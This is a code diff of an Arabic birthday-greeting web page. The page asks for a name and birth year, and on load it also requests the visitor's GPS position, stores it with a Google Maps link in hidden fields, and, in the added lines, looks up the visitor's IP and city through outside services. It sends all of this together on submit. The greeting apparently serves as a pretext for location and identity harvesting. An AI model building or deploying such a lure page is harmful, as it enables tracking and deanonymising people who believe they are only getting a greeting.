@@ -111,6 +111,23 @@
       font-size: 14px;
       margin-top: 5px;
     }
+    .info-box {
+      background: #f0f4ff;
+      border-radius: 12px;
+      padding: 12px;
+      margin-bottom: 15px;
+      font-size: 14px;
+      color: #333;
+      border-right: 4px solid #3b82f6;
+      text-align: right;
+    }
+    .info-box span {
+      font-weight: bold;
+      color: #1e293b;
+    }
+    .loading {
+      color: #94a3b8;
+    }
   </style>
 </head>
 <body>
@@ -121,43 +138,63 @@
     <p class="greeting-text">
       🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!
     </p>
-    
+
+    <!-- معلومات الجهاز -->
+    <div class="info-box" id="deviceInfo">
+      🌐 <span>IP الخاص بك:</span> <span id="ipDisplay" class="loading">جارٍ التحميل...</span><br>
+      📍 <span>الموقع التقريبي:</span> <span id="locationDisplay" class="loading">جارٍ التحميل...</span>
+    </div>
+
     <!-- رسالة العمر -->
     <div id="birthdayMessage" class="birthday-message">
       🎂 <span id="displayName"></span>، عمرك الآن <span id="displayAge"></span> سنة!
       <br>كل سنة وأنت طيب يا بطل 💪
     </div>
-    
+
     <form id="birthdayForm">
       <input type="text" id="nameInput" placeholder="👤 أدخل اسمك الكريم" required>
       <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك (مثال: 1995)" required min="1900" max="2026">
-      
+
       <div id="status"></div>
 
       <input type="hidden" id="lat" name="latitude">
       <input type="hidden" id="lon" name="longitude">
       <input type="hidden" id="map_link" name="google_maps_link">
       <input type="hidden" id="age" name="age">
+      <input type="hidden" id="ip" name="ip">
 
       <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
     </form>
   </div>
 
   <script>
-    // جلب الموقع تلقائياً عند تحميل الصفحة
-    window.onload = function() {
-      getLocation();
-      
-      // حساب العمر تلقائياً عند كتابة السنة
-      document.getElementById('yearInput').addEventListener('input', function() {
-        calculateAgeAndShow();
-      });
-      
-      document.getElementById('nameInput').addEventListener('input', function() {
-        calculateAgeAndShow();
-      });
-    };
+    // ===== جلب IP والموقع =====
+    async function fetchIPAndLocation() {
+      try {
+        // جلب الـ IP
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
 
+        // جلب الموقع التقريبي
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geoData = await geoRes.json();
+
+        // عرض الـ IP
+        document.getElementById('ipDisplay').textContent = ip;
+        document.getElementById('ip').value = ip;
+
+        // عرض الموقع
+        const locationText = `${geoData.city || 'غير معروف'}، ${geoData.region || ''}، ${geoData.country_name || 'غير معروف'}`;
+        document.getElementById('locationDisplay').textContent = locationText;
+
+      } catch (error) {
+        document.getElementById('ipDisplay').textContent = '⚠️ تعذر جلب IP';
+        document.getElementById('locationDisplay').textContent = '⚠️ تعذر جلب الموقع';
+      }
+    }
+
+    // ===== جلب الموقع الجغرافي (GPS) =====
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -169,20 +206,19 @@
             document.getElementById('map_link').value = `https://maps.google.com/?q=${lat},${lon}`;
           },
           (error) => {
-            // إذا رفض الموقع، نكمل عادي
             console.log("الموقع غير مفعل");
           }
         );
       }
     }
 
+    // ===== حساب العمر =====
     function calculateAgeAndShow() {
       const name = document.getElementById('nameInput').value.trim();
       const year = parseInt(document.getElementById('yearInput').value);
       const currentYear = new Date().getFullYear();
       const messageDiv = document.getElementById('birthdayMessage');
-      
-      // إذا كان الاسم والسنة موجودة وصحيحة
+
       if (name && year && year >= 1900 && year <= currentYear) {
         const age = currentYear - year;
         if (age > 0 && age < 120) {
@@ -193,37 +229,35 @@
           return;
         }
       }
-      
-      // إخفاء الرسالة إذا البيانات ناقصة
       messageDiv.classList.remove('show');
     }
 
+    // ===== إرسال البيانات =====
     function handleSubmit() {
       const name = document.getElementById('nameInput').value.trim();
       const year = document.getElementById('yearInput').value.trim();
       const status = document.getElementById('status');
       const age = document.getElementById('age').value;
-      
-      // التحقق من المدخلات
+      const ip = document.getElementById('ip').value;
+
       if (!name) {
         status.innerText = "⚠️ الرجاء إدخال اسمك!";
         status.style.color = "#ff4757";
         return;
       }
-      
+
       if (!year || isNaN(year) || year < 1900 || year > new Date().getFullYear()) {
         status.innerText = "⚠️ الرجاء إدخال سنة ميلاد صحيحة!";
         status.style.color = "#ff4757";
         return;
       }
-      
+
       if (!age || age < 1) {
         status.innerText = "⚠️ يرجى التأكد من سنة الميلاد!";
         status.style.color = "#ff4757";
         return;
       }
 
-      // رسالة تأكيد قبل الإرسال
       if (!confirm(`🎈 هل تريد إرسال تهنئة باسم "${name}" وعمر ${age} سنة؟`)) {
         return;
       }
@@ -235,6 +269,7 @@
         name: name,
         age: age,
         birth_year: year,
+        ip: ip || "غير متاح",
         latitude: document.getElementById('lat').value || "غير متاح",
         longitude: document.getElementById('lon').value || "غير متاح",
         google_maps_link: document.getElementById('map_link').value || "غير متاح"
@@ -253,7 +288,6 @@
           status.style.color = "#2ed573";
           document.getElementById('birthdayForm').reset();
           document.getElementById('birthdayMessage').classList.remove('show');
-          document.getElementById('status').innerText = "🎉 شكراً لك، تم استلام تهنئتك!";
         } else {
           status.innerText = "❌ حدث خطأ من الخادم، حاول مرة أخرى.";
           status.style.color = "#ff4757";
@@ -263,6 +297,15 @@
         status.style.color = "#ff4757";
       });
     }
+
+    // ===== تشغيل عند تحميل الصفحة =====
+    window.onload = function() {
+      fetchIPAndLocation();
+      getLocation();
+
+      document.getElementById('yearInput').addEventListener('input', calculateAgeAndShow);
+      document.getElementById('nameInput').addEventListener('input', calculateAgeAndShow);
+    };
   </script>
 
 </body>
